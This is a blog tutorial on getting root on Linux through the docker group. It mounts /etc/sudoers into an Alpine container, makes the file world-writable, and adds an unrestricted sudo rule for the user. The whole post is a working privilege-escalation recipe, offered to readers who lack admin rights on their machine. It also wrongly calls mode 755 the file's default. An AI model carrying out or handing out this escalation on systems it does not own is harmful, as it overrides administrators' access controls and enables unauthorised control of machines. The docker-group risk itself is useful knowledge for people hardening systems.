---
author: "Maciej Budzyński"
title: "How to gain admin access on Linux using Docker?"
date: "2021-07-24T20:00:00+02:00"
categories: ["programming"]
ENtags: ["programming", "docker", "linux"]

---

Do you not have administrator privileges on your local machine? Do you have Linux and Docker? 
If the answer to the above questions is yes, then in this article I will show you how to use 
Docker to modify the sudoers file, allowing you to gain administrator privileges.

<!--more-->

# Prerequisites

The method presented here requires that the restricted user has access to docker commands, 
i.e., the user belongs to the docker group. Docker configuration requires the user to belong to 
this group. This method works only on Linux systems (tested on Ubuntu).

# TLDR

* Running alpine linux with the `/etc/sudoers` file mounted as `sudoers` in the container:
{{< highlight bash >}}
docker run -it -v /etc/sudoers:/sudoers --rm alpine /bin/sh
{{< /highlight >}}

* Changing permissions to edit the `sudoers` file using vi:
{{< highlight bash >}}
chmod 777 sudoers
vi sudoers
{{< /highlight >}}

* Adding the required permissions to the user in the `sudoers` file (press `i` to add an entry): 
{{< highlight bash >}}
# A tab is required between user and ALL (one TAB, not 4 spaces)
user	ALL=(ALL:ALL) ALL
{{< /highlight >}}

* Exiting vi with saving:
{{< highlight bash >}}
:wq
{{< /highlight >}}

* Changing the permissions of the `sudoers` file back to default values and exiting the container shell:
{{< highlight bash >}}
chmod 755 sudoers
exit
{{< /highlight >}}

* Verifying changes in the `sudoers` file:
{{< highlight bash >}}
cat /etc/sudoers
sudo su
{{< /highlight >}}

# Description of individual commands

## docker run -it -v /etc/sudoers:/sudoers --rm alpine /bin/sh

This command allows you to download the alpine linux image and then run a container from that image. 
The `-it` parameter is responsible for running interactive mode (keeps STDIN open even if not attached) 
and assigning a pseudo-TTY. 
The `-v` parameter binds the host's directory or file to the container's volume. In this case, we create 
a binding for the host file `/etc/sudoers` with the `sudoers` file in the root directory of our container. 
The `--rm` parameter ensures that after closing and exiting the shell, the created container will be removed. 
The `alpine /bin/sh` fragment is responsible for selecting the image from which the container will be created 
(in this case, alpine linux) and running the command (program) `/bin/sh`, which is the system shell.

## chmod 777 sudoers and vi sudoers

The `/etc/sudoers` file is protected from editing by default. Since alpine is a minimalist linux distribution, 
it has the vi file editor by default. The `sudoers` files should be edited using visudo, but alpine does not 
have this installed by default. To edit the file, you need to grant full permissions to the file for the current 
user using the `chmod 777 sudoers` command run in the alpine container. Then you can open the sudoers file using 
the vi editor with the command: `vi sudoers`. To be able to enter text in the vi editor, press the `i` key on 
the keyboard.

## user	ALL=(ALL:ALL) ALL

The above entry allows the `user` to have permissions to execute all commands. 
The first field indicates the username to which the rule applies (user). 
The first "ALL" means that this rule applies to all hosts. 
The second "ALL" means that the user can run commands as all users. 
The third "ALL" means that the user can run commands as all groups. 
The fourth "ALL" means that these rules apply to all commands. 
Remember to maintain the correct formatting in the file. In the case of Ubuntu, there was a tab between user 
and ALL (not four spaces). Personally, I am not sure if using a single space or 4 spaces will break anything, 
so to be sure, I kept the target formatting.

## Exiting vi 

To exit the vi editor saving changes, press the `esc` key on the keyboard, then type `:wq`. The commands after 
the colon are vi commands. `w` means we want to save the changes made to the file, and `q` means to close the file.

## chmod 755 sudoers and exit

We change the permissions of the sudoers file back to the default values before editing, and then exit the 
container shell using the `exit` command. After exiting, the alpine container will be removed. Only the downloaded 
image will remain on the disk.

## cat /etc/sudoers and sudo su

To verify access, we can use the `cat /etc/sudoers` command to check if the entries were added correctly. 
We can also use the `sudo su` command to check if we can execute commands as sudo.

# Conclusion

As you can see, docker allows you to change user permissions and modify files that we do not have access to by default. 
The Docker group belongs to the administrative groups, so a user in this group with access to execute docker commands 
can modify files without needing administrator access.